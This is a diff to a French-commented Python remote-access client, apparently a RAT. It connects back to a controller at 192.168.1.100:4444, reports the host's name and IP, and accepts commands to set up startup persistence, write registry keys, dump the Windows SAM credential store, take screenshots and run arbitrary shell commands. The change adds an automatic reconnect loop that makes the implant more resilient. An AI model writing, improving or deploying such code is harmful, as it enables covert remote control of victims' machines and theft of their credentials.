@@ -3,6 +3,7 @@ import subprocess
 import os
 import sys
 import base64
+import time
 
 SERVER_IP = "192.168.1.100"
 SERVER_PORT = 4444
@@ -22,50 +23,61 @@ def get_ip():
 
 
 def main():
-    print("[*] Demarrage du client...")
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((SERVER_IP, SERVER_PORT))
-    print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")
-
-    # on envoie le hostname et notre ip au serveur
-    info = f"{socket.gethostname()} - {get_ip()}"
-    sock.send(info.encode())
+    print(f"[*] Client demarre - IP: {get_ip()}")
 
     while True:
-        commande = sock.recv(BUFFER).decode().strip()
-        if not commande:
-            print("[-] Connexion perdue")
-            break
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((SERVER_IP, SERVER_PORT))
+            print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")
 
-        if commande == "exit":
-            break
+            # on envoie le hostname et notre ip
+            sock.send(f"{socket.gethostname()} - {get_ip()}".encode())
 
-        elif commande == "persistance":
-            resultat = setup_persistence()
-            sock.send(resultat.encode())
+            while True:
+                try:
+                    commande = sock.recv(BUFFER).decode("utf-8").strip()
+                    if not commande:
+                        break
 
-        elif commande.startswith("regedit "):
-            parts = commande.split(" ", 3)
-            if len(parts) == 4:
-                resultat = add_registry_key(parts[1], parts[2], parts[3])
-            else:
-                resultat = "Usage: regedit CHEMIN NOM VALEUR"
-            sock.send(resultat.encode())
+                    if commande == "exit":
+                        sock.close()
+                        return
 
-        elif commande == "sam":
-            resultat = dump_sam()
-            sock.sendall(resultat.encode())
+                    elif commande == "persistance":
+                        resultat = setup_persistence()
+                        sock.send(resultat.encode())
 
-        elif commande == "screenshot":
-            resultat = take_screenshot()
-            sock.sendall(resultat.encode())
+                    elif commande.startswith("regedit "):
+                        parts = commande.split(" ", 3)
+                        if len(parts) == 4:
+                            resultat = add_registry_key(parts[1], parts[2], parts[3])
+                        else:
+                            resultat = "Usage: regedit CHEMIN NOM VALEUR"
+                        sock.send(resultat.encode())
 
-        else:
-            resultat = execute_cmd(commande)
-            sock.send(resultat.encode())
+                    elif commande == "sam":
+                        resultat = dump_sam()
+                        sock.sendall(resultat.encode())
 
-    sock.close()
+                    elif commande == "screenshot":
+                        resultat = take_screenshot()
+                        sock.sendall(resultat.encode())
+
+                    else:
+                        resultat = execute_cmd(commande)
+                        sock.send(resultat.encode())
+
+                except Exception as e:
+                    print(f"[!] Erreur: {e}")
+                    try:
+                        sock.send(f"Erreur: {e}".encode())
+                    except:
+                        break
+
+        except:
+            print("[*] Reconnexion dans 5s...")
+            time.sleep(5)
 
 
 # se copie dans appdata et s'ajoute au demarrage de windows
